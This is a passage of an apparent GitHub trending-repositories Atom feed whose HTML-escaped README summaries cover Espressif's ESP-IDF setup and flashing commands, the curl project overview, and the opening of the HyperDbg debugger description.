with other databases&lt;/a&gt;.&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
  <entry>
    <title>espressif/esp-idf</title>
    <updated>2022-06-03T01:34:42Z</updated>
    <id>tag:github.com,2022-06-03:/espressif/esp-idf</id>
    <link href="https://github.com/espressif/esp-idf" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Espressif IoT Development Framework. Official development framework for Espressif SoCs.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Espressif IoT Development Framework&lt;/h1&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/espressif/esp-idf/master/README_CN.md&#34;&gt;中文版&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;ESP-IDF is the development framework for Espressif SoCs supported on Windows, Linux and macOS.&lt;/p&gt; &#xA;&lt;h1&gt;ESP-IDF Release Support Schedule&lt;/h1&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://dl.espressif.com/dl/esp-idf/support-periods.svg?sanitize=true&#34; alt=&#34;Support Schedule&#34;&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Please read &lt;a href=&#34;https://raw.githubusercontent.com/espressif/esp-idf/master/SUPPORT_POLICY.md&#34;&gt;the support policy&lt;/a&gt; and &lt;a href=&#34;https://docs.espressif.com/projects/esp-idf/en/latest/esp32/versions.html&#34;&gt;the documentation&lt;/a&gt; for more information about ESP-IDF versions.&lt;/li&gt; &#xA; &lt;li&gt;Please see the &lt;a href=&#34;https://www.espressif.com/en/support/documents/advisories?keys=&amp;amp;field_type_of_advisory_tid%5B%5D=817&#34;&gt;End-of-Life Advisories&lt;/a&gt; for information about ESP-IDF releases with discontinued support.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h1&gt;ESP-IDF Release and SoC Compatibility&lt;/h1&gt; &#xA;&lt;p&gt;The following table shows ESP-IDF support of Espressif SoCs where &lt;img src=&#34;https://img.shields.io/badge/-preview-orange&#34; alt=&#34;alt text&#34; title=&#34;preview&#34;&gt; and &lt;img src=&#34;https://img.shields.io/badge/-supported-green&#34; alt=&#34;alt text&#34; title=&#34;supported&#34;&gt; denote preview status and support, respectively. The preview support is usually limited in time and intended for beta versions of chips. Please use an ESP-IDF release where the desired SoC is already supported.&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th align=&#34;left&#34;&gt;Chip&lt;/th&gt; &#xA;   &lt;th align=&#34;center&#34;&gt;v4.1&lt;/th&gt; &#xA;   &lt;th align=&#34;center&#34;&gt;v4.2&lt;/th&gt; &#xA;   &lt;th align=&#34;center&#34;&gt;v4.3&lt;/th&gt; &#xA;   &lt;th align=&#34;center&#34;&gt;v4.4&lt;/th&gt; &#xA;   &lt;th align=&#34;center&#34;&gt;v5.0&lt;/th&gt; &#xA;   &lt;th align=&#34;left&#34;&gt;&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;left&#34;&gt;ESP32&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/-supported-green&#34; alt=&#34;alt text&#34; title=&#34;supported&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/-supported-green&#34; alt=&#34;alt text&#34; title=&#34;supported&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/-supported-green&#34; alt=&#34;alt text&#34; title=&#34;supported&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/-supported-green&#34; alt=&#34;alt text&#34; title=&#34;supported&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/-supported-green&#34; alt=&#34;alt text&#34; title=&#34;supported&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;left&#34;&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;left&#34;&gt;ESP32-S2&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/-supported-green&#34; alt=&#34;alt text&#34; title=&#34;supported&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/-supported-green&#34; alt=&#34;alt text&#34; title=&#34;supported&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/-supported-green&#34; alt=&#34;alt text&#34; title=&#34;supported&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/-supported-green&#34; alt=&#34;alt text&#34; title=&#34;supported&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;left&#34;&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;left&#34;&gt;ESP32-C3&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/-supported-green&#34; alt=&#34;alt text&#34; title=&#34;supported&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/-supported-green&#34; alt=&#34;alt text&#34; title=&#34;supported&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/-supported-green&#34; alt=&#34;alt text&#34; title=&#34;supported&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;left&#34;&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;left&#34;&gt;ESP32-S3&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/-supported-green&#34; alt=&#34;alt text&#34; title=&#34;supported&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/-supported-green&#34; alt=&#34;alt text&#34; title=&#34;supported&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.espressif.com/en/news/ESP32_S3&#34;&gt;Announcement&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;left&#34;&gt;ESP32-C2&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/-supported-green&#34; alt=&#34;alt text&#34; title=&#34;supported&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://blog.espressif.com/esp32-c2-and-why-it-matter-s-bcf4d7d0b2c6&#34;&gt;Announcement&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;left&#34;&gt;ESP32-H2&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/-preview-orange&#34; alt=&#34;alt text&#34; title=&#34;preview&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/-preview-orange&#34; alt=&#34;alt text&#34; title=&#34;preview&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.espressif.com/en/news/ESP32_H2&#34;&gt;Announcement&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;p&gt;Espressif SoCs released before 2016 (ESP8266 and ESP8285) are supported by &lt;a href=&#34;https://github.com/espressif/ESP8266_RTOS_SDK&#34;&gt;RTOS SDK&lt;/a&gt; instead.&lt;/p&gt; &#xA;&lt;h1&gt;Developing With ESP-IDF&lt;/h1&gt; &#xA;&lt;h2&gt;Setting Up ESP-IDF&lt;/h2&gt; &#xA;&lt;p&gt;See &lt;a href=&#34;https://idf.espressif.com/&#34;&gt;https://idf.espressif.com/&lt;/a&gt; for links to detailed instructions on how to set up the ESP-IDF depending on chip you use.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; Each SoC series and each ESP-IDF release has its own documentation. Please see Section &lt;a href=&#34;https://docs.espressif.com/projects/esp-idf/en/latest/esp32/versions.html&#34;&gt;Versions&lt;/a&gt; on how to find documentation and how to checkout specific release of ESP-IDF.&lt;/p&gt; &#xA;&lt;h3&gt;Non-GitHub forks&lt;/h3&gt; &#xA;&lt;p&gt;ESP-IDF uses relative locations as its submodules URLs (&lt;a href=&#34;https://raw.githubusercontent.com/espressif/esp-idf/master/.gitmodules&#34;&gt;.gitmodules&lt;/a&gt;). So they link to GitHub. If ESP-IDF is forked to a Git repository which is not on GitHub, you will need to run the script &lt;a href=&#34;https://raw.githubusercontent.com/espressif/esp-idf/master/tools/set-submodules-to-github.sh&#34;&gt;tools/set-submodules-to-github.sh&lt;/a&gt; after git clone.&lt;/p&gt; &#xA;&lt;p&gt;The script sets absolute URLs for all submodules, allowing &lt;code&gt;git submodule update --init --recursive&lt;/code&gt; to complete. If cloning ESP-IDF from GitHub, this step is not needed.&lt;/p&gt; &#xA;&lt;h2&gt;Finding a Project&lt;/h2&gt; &#xA;&lt;p&gt;As well as the &lt;a href=&#34;https://github.com/espressif/esp-idf-template&#34;&gt;esp-idf-template&lt;/a&gt; project mentioned in Getting Started, ESP-IDF comes with some example projects in the &lt;a href=&#34;https://raw.githubusercontent.com/espressif/esp-idf/master/examples&#34;&gt;examples&lt;/a&gt; directory.&lt;/p&gt; &#xA;&lt;p&gt;Once you&#39;ve found the project you want to work with, change to its directory and you can configure and build it.&lt;/p&gt; &#xA;&lt;p&gt;To start your own project based on an example, copy the example project directory outside of the ESP-IDF directory.&lt;/p&gt; &#xA;&lt;h1&gt;Quick Reference&lt;/h1&gt; &#xA;&lt;p&gt;See the Getting Started guide links above for a detailed setup guide. This is a quick reference for common commands when working with ESP-IDF projects:&lt;/p&gt; &#xA;&lt;h2&gt;Setup Build Environment&lt;/h2&gt; &#xA;&lt;p&gt;(See the Getting Started guide listed above for a full list of required steps with more details.)&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Install host build dependencies mentioned in the Getting Started guide.&lt;/li&gt; &#xA; &lt;li&gt;Run the install script to set up the build environment. The options include &lt;code&gt;install.bat&lt;/code&gt; or &lt;code&gt;install.ps1&lt;/code&gt; for Windows, and &lt;code&gt;install.sh&lt;/code&gt; or &lt;code&gt;install.fish&lt;/code&gt; for Unix shells.&lt;/li&gt; &#xA; &lt;li&gt;Run the export script on Windows (&lt;code&gt;export.bat&lt;/code&gt;) or source it on Unix (&lt;code&gt;source export.sh&lt;/code&gt;) in every shell environment before using ESP-IDF.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Configuring the Project&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;idf.py set-target &amp;lt;chip_name&amp;gt;&lt;/code&gt; sets the target of the project to &lt;code&gt;&amp;lt;chip_name&amp;gt;&lt;/code&gt;. Run &lt;code&gt;idf.py set-target&lt;/code&gt; without any arguments to see a list of supported targets.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;idf.py menuconfig&lt;/code&gt; opens a text-based configuration menu where you can configure the project.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Compiling the Project&lt;/h2&gt; &#xA;&lt;p&gt;&lt;code&gt;idf.py build&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;... will compile app, bootloader and generate a partition table based on the config.&lt;/p&gt; &#xA;&lt;h2&gt;Flashing the Project&lt;/h2&gt; &#xA;&lt;p&gt;When the build finishes, it will print a command line to use esptool.py to flash the chip. However you can also do this automatically by running:&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;idf.py -p PORT flash&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;Replace PORT with the name of your serial port (like &lt;code&gt;COM3&lt;/code&gt; on Windows, &lt;code&gt;/dev/ttyUSB0&lt;/code&gt; on Linux, or &lt;code&gt;/dev/cu.usbserial-X&lt;/code&gt; on MacOS. If the &lt;code&gt;-p&lt;/code&gt; option is left out, &lt;code&gt;idf.py flash&lt;/code&gt; will try to flash the first available serial port.&lt;/p&gt; &#xA;&lt;p&gt;This will flash the entire project (app, bootloader and partition table) to a new chip. The settings for serial port flashing can be configured with &lt;code&gt;idf.py menuconfig&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;You don&#39;t need to run &lt;code&gt;idf.py build&lt;/code&gt; before running &lt;code&gt;idf.py flash&lt;/code&gt;, &lt;code&gt;idf.py flash&lt;/code&gt; will automatically rebuild anything which needs it.&lt;/p&gt; &#xA;&lt;h2&gt;Viewing Serial Output&lt;/h2&gt; &#xA;&lt;p&gt;The &lt;code&gt;idf.py monitor&lt;/code&gt; target uses the &lt;a href=&#34;https://docs.espressif.com/projects/esp-idf/en/latest/get-started/idf-monitor.html&#34;&gt;idf_monitor tool&lt;/a&gt; to display serial output from Espressif SoCs. idf_monitor also has a range of features to decode crash output and interact with the device. &lt;a href=&#34;https://docs.espressif.com/projects/esp-idf/en/latest/get-started/idf-monitor.html&#34;&gt;Check the documentation page for details&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Exit the monitor by typing Ctrl-].&lt;/p&gt; &#xA;&lt;p&gt;To build, flash and monitor output in one pass, you can run:&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;idf.py flash monitor&lt;/code&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Compiling &amp;amp; Flashing Only the App&lt;/h2&gt; &#xA;&lt;p&gt;After the initial flash, you may just want to build and flash just your app, not the bootloader and partition table:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;idf.py app&lt;/code&gt; - build just the app.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;idf.py app-flash&lt;/code&gt; - flash just the app.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;code&gt;idf.py app-flash&lt;/code&gt; will automatically rebuild the app if any source files have changed.&lt;/p&gt; &#xA;&lt;p&gt;(In normal development there&#39;s no downside to reflashing the bootloader and partition table each time, if they haven&#39;t changed.)&lt;/p&gt; &#xA;&lt;h2&gt;Erasing Flash&lt;/h2&gt; &#xA;&lt;p&gt;The &lt;code&gt;idf.py flash&lt;/code&gt; target does not erase the entire flash contents. However it is sometimes useful to set the device back to a totally erased state, particularly when making partition table changes or OTA app updates. To erase the entire flash, run &lt;code&gt;idf.py erase-flash&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;This can be combined with other targets, ie &lt;code&gt;idf.py -p PORT erase-flash flash&lt;/code&gt; will erase everything and then re-flash the new app, bootloader and partition table.&lt;/p&gt; &#xA;&lt;h1&gt;Resources&lt;/h1&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;Documentation for the latest version: &lt;a href=&#34;https://docs.espressif.com/projects/esp-idf/&#34;&gt;https://docs.espressif.com/projects/esp-idf/&lt;/a&gt;. This documentation is built from the &lt;a href=&#34;https://raw.githubusercontent.com/espressif/esp-idf/master/docs&#34;&gt;docs directory&lt;/a&gt; of this repository.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;The &lt;a href=&#34;https://esp32.com/&#34;&gt;esp32.com forum&lt;/a&gt; is a place to ask questions and find community resources.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/espressif/esp-idf/issues&#34;&gt;Check the Issues section on github&lt;/a&gt; if you find a bug or have a feature request. Please check existing Issues before opening a new one.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;If you&#39;re interested in contributing to ESP-IDF, please check the &lt;a href=&#34;https://docs.espressif.com/projects/esp-idf/en/latest/contribute/index.html&#34;&gt;Contributions Guide&lt;/a&gt;.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
  <entry>
    <title>curl/curl</title>
    <updated>2022-06-03T01:34:42Z</updated>
    <id>tag:github.com,2022-06-03:/curl/curl</id>
    <link href="https://github.com/curl/curl" rel="alternate"></link>
    <summary type="html">&lt;p&gt;A command line tool and library for transferring data with URL syntax, supporting DICT, FILE, FTP, FTPS, GOPHER, GOPHERS, HTTP, HTTPS, IMAP, IMAPS, LDAP, LDAPS, MQTT, POP3, POP3S, RTMP, RTMPS, RTSP, SCP, SFTP, SMB, SMBS, SMTP, SMTPS, TELNET and TFTP. libcurl offers a myriad of powerful features&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;&lt;img src=&#34;https://curl.se/logo/curl-logo.svg?sanitize=true&#34; alt=&#34;curl logo&#34;&gt;&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://bestpractices.coreinfrastructure.org/projects/63&#34;&gt;&lt;img src=&#34;https://bestpractices.coreinfrastructure.org/projects/63/badge&#34; alt=&#34;CII Best Practices&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://scan.coverity.com/projects/curl&#34;&gt;&lt;img src=&#34;https://scan.coverity.com/projects/curl/badge.svg?sanitize=true&#34; alt=&#34;Coverity passed&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://ci.appveyor.com/project/curlorg/curl&#34;&gt;&lt;img src=&#34;https://ci.appveyor.com/api/projects/status/l1vv31029huhf4g4?svg=true&#34; alt=&#34;AppVeyor Build Status&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://dev.azure.com/daniel0244/curl/_build/latest?definitionId=1&amp;amp;branchName=master&#34;&gt;&lt;img src=&#34;https://dev.azure.com/daniel0244/curl/_apis/build/status/curl.curl?branchName=master&#34; alt=&#34;Azure DevOps Build Status&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://cirrus-ci.com/github/curl/curl&#34;&gt;&lt;img src=&#34;https://api.cirrus-ci.com/github/curl/curl.svg?branch=master&#34; alt=&#34;Cirrus Build Status&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://raw.githubusercontent.com/curl/curl/master/#backers&#34;&gt;&lt;img src=&#34;https://opencollective.com/curl/backers/badge.svg?sanitize=true&#34; alt=&#34;Backers on Open Collective&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://raw.githubusercontent.com/curl/curl/master/#sponsors&#34;&gt;&lt;img src=&#34;https://opencollective.com/curl/sponsors/badge.svg?sanitize=true&#34; alt=&#34;Sponsors on Open Collective&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://lgtm.com/projects/g/curl/curl/context:cpp&#34;&gt;&lt;img src=&#34;https://img.shields.io/lgtm/grade/cpp/g/curl/curl.svg?logo=lgtm&amp;amp;logoWidth=18&#34; alt=&#34;Language Grade: C/C++&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://bugs.chromium.org/p/oss-fuzz/issues/list?sort=-opened&amp;amp;can=1&amp;amp;q=proj:curl&#34;&gt;&lt;img src=&#34;https://oss-fuzz-build-logs.storage.googleapis.com/badges/curl.svg?sanitize=true&#34; alt=&#34;Fuzzing Status&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Curl is a command-line tool for transferring data specified with URL syntax. Find out how to use curl by reading &lt;a href=&#34;https://curl.se/docs/manpage.html&#34;&gt;the curl.1 man page&lt;/a&gt; or &lt;a href=&#34;https://curl.se/docs/manual.html&#34;&gt;the MANUAL document&lt;/a&gt;. Find out how to install Curl by reading &lt;a href=&#34;https://curl.se/docs/install.html&#34;&gt;the INSTALL document&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;libcurl is the library curl is using to do its job. It is readily available to be used by your software. Read &lt;a href=&#34;https://curl.se/libcurl/c/libcurl.html&#34;&gt;the libcurl.3 man page&lt;/a&gt; to learn how.&lt;/p&gt; &#xA;&lt;p&gt;You can find answers to the most frequent questions we get in &lt;a href=&#34;https://curl.se/docs/faq.html&#34;&gt;the FAQ document&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Study &lt;a href=&#34;https://curl.se/docs/copyright.html&#34;&gt;the COPYING file&lt;/a&gt; for distribution terms.&lt;/p&gt; &#xA;&lt;h2&gt;Contact&lt;/h2&gt; &#xA;&lt;p&gt;If you have problems, questions, ideas or suggestions, please contact us by posting to a suitable &lt;a href=&#34;https://curl.se/mail/&#34;&gt;mailing list&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;All contributors to the project are listed in &lt;a href=&#34;https://curl.se/docs/thanks.html&#34;&gt;the THANKS document&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Commercial support&lt;/h2&gt; &#xA;&lt;p&gt;For commercial support, maybe private and dedicated help with your problems or applications using (lib)curl visit &lt;a href=&#34;https://curl.se/support.html&#34;&gt;the support page&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Website&lt;/h2&gt; &#xA;&lt;p&gt;Visit the &lt;a href=&#34;https://curl.se/&#34;&gt;curl website&lt;/a&gt; for the latest news and downloads.&lt;/p&gt; &#xA;&lt;h2&gt;Git&lt;/h2&gt; &#xA;&lt;p&gt;To download the latest source from the Git server do this:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;git clone https://github.com/curl/curl.git&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;(you will get a directory named curl created, filled with the source code)&lt;/p&gt; &#xA;&lt;h2&gt;Security problems&lt;/h2&gt; &#xA;&lt;p&gt;Report suspected security problems via &lt;a href=&#34;https://hackerone.com/curl&#34;&gt;our HackerOne page&lt;/a&gt; and not in public!&lt;/p&gt; &#xA;&lt;h2&gt;Notice&lt;/h2&gt; &#xA;&lt;p&gt;Curl contains pieces of source code that is Copyright (c) 1998, 1999 Kungliga Tekniska Högskolan. This notice is included here to comply with the distribution terms.&lt;/p&gt; &#xA;&lt;h2&gt;Backers&lt;/h2&gt; &#xA;&lt;p&gt;Thank you to all our backers! 🙏 [&lt;a href=&#34;https://opencollective.com/curl#backer&#34;&gt;Become a backer&lt;/a&gt;]&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://opencollective.com/curl#backers&#34;&gt;&lt;img src=&#34;https://opencollective.com/curl/backers.svg?width=890&#34; alt=&#34;Open Collective Backers&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Sponsors&lt;/h2&gt; &#xA;&lt;p&gt;Support this project by becoming a sponsor. Your logo will show up here with a link to your website. [&lt;a href=&#34;https://opencollective.com/curl#sponsor&#34;&gt;Become a sponsor&lt;/a&gt;]&lt;/p&gt; &#xA;&lt;!-- markdown-link-check-disable --&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://opencollective.com/curl/sponsor/0/website&#34;&gt;&lt;img src=&#34;https://opencollective.com/curl/sponsor/0/avatar.svg?sanitize=true&#34; alt=&#34;Open Collective Sponsor 0&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://opencollective.com/curl/sponsor/1/website&#34;&gt;&lt;img src=&#34;https://opencollective.com/curl/sponsor/1/avatar.svg?sanitize=true&#34; alt=&#34;Open Collective Sponsor 1&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://opencollective.com/curl/sponsor/2/website&#34;&gt;&lt;img src=&#34;https://opencollective.com/curl/sponsor/2/avatar.svg?sanitize=true&#34; alt=&#34;Open Collective Sponsor 2&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://opencollective.com/curl/sponsor/3/website&#34;&gt;&lt;img src=&#34;https://opencollective.com/curl/sponsor/3/avatar.svg?sanitize=true&#34; alt=&#34;Open Collective Sponsor 3&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://opencollective.com/curl/sponsor/4/website&#34;&gt;&lt;img src=&#34;https://opencollective.com/curl/sponsor/4/avatar.svg?sanitize=true&#34; alt=&#34;Open Collective Sponsor 4&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://opencollective.com/curl/sponsor/5/website&#34;&gt;&lt;img src=&#34;https://opencollective.com/curl/sponsor/5/avatar.svg?sanitize=true&#34; alt=&#34;Open Collective Sponsor 5&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://opencollective.com/curl/sponsor/6/website&#34;&gt;&lt;img src=&#34;https://opencollective.com/curl/sponsor/6/avatar.svg?sanitize=true&#34; alt=&#34;Open Collective Sponsor 6&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://opencollective.com/curl/sponsor/7/website&#34;&gt;&lt;img src=&#34;https://opencollective.com/curl/sponsor/7/avatar.svg?sanitize=true&#34; alt=&#34;Open Collective Sponsor 7&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://opencollective.com/curl/sponsor/8/website&#34;&gt;&lt;img src=&#34;https://opencollective.com/curl/sponsor/8/avatar.svg?sanitize=true&#34; alt=&#34;Open Collective Sponsor 8&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://opencollective.com/curl/sponsor/9/website&#34;&gt;&lt;img src=&#34;https://opencollective.com/curl/sponsor/9/avatar.svg?sanitize=true&#34; alt=&#34;Open Collective Sponsor 9&#34;&gt;&lt;/a&gt;&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>HyperDbg/HyperDbg</title>
    <updated>2022-06-03T01:34:42Z</updated>
    <id>tag:github.com,2022-06-03:/HyperDbg/HyperDbg</id>
    <link href="https://github.com/HyperDbg/HyperDbg" rel="alternate"></link>
    <summary type="html">&lt;p&gt;State-of-the-art native debugging tool&lt;/p&gt;&lt;hr&gt;&lt;p align=&#34;left&#34;&gt; &lt;a href=&#34;https://hyperdbg.org&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/HyperDbg/graphics/master/Badges/Link-Website-orange.svg?sanitize=true&#34; alt=&#34;Website&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://docs.hyperdbg.org&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/HyperDbg/graphics/master/Badges/Link-Docs-yellow.svg?sanitize=true&#34; alt=&#34;Documentation&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://doxygen.hyperdbg.org&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/HyperDbg/graphics/master/Badges/Link-Doxygen-lightgreen.svg?sanitize=true&#34; alt=&#34;Doxygen&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://www.gnu.org/licenses/gpl-3.0&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/HyperDbg/graphics/master/Badges/License-GPLv3-blue.svg?sanitize=true&#34; alt=&#34;License&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/HyperDbg/HyperDbg#publications&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/HyperDbg/graphics/master/Badges/Published-Papers-red.svg?sanitize=true&#34; alt=&#34;Published Academic Papers&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://twitter.com/HyperDbg&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/HyperDbg/graphics/master/Badges/Link-HyperDbg-Twitter-skyblue.svg?sanitize=true&#34; alt=&#34;Twitter&#34;&gt;&lt;/a&gt; &lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://hyperdbg.org/&#34;&gt;&lt;img align=&#34;right&#34; width=&#34;150&#34; height=&#34;150&#34; src=&#34;https://github.com/HyperDbg/graphics/raw/master/Art%20Board/HyperDbg-Cat.Circle.Compressed.png&#34; alt=&#34;HyperDbg Debugger&#34;&gt;&lt;/a&gt;&lt;br&gt;&lt;/p&gt; &#xA;&lt;h1&gt;HyperDbg Debugger&lt;/h1&gt; &#xA;&lt;p&gt;HyperDbg Debugger is an open-source, community-driven, hypervisor-assisted, user-mode and kernel-mode Windows debugger with a focus on using modern hardware technologies. It is a debugger designed for analyzing, fuzzing and reversing.&lt;/p&gt; &#xA;&lt;p&gt;Follow &lt;strong&gt;HyperDbg&lt;/strong&gt; on &lt;strong&gt;&lt;a 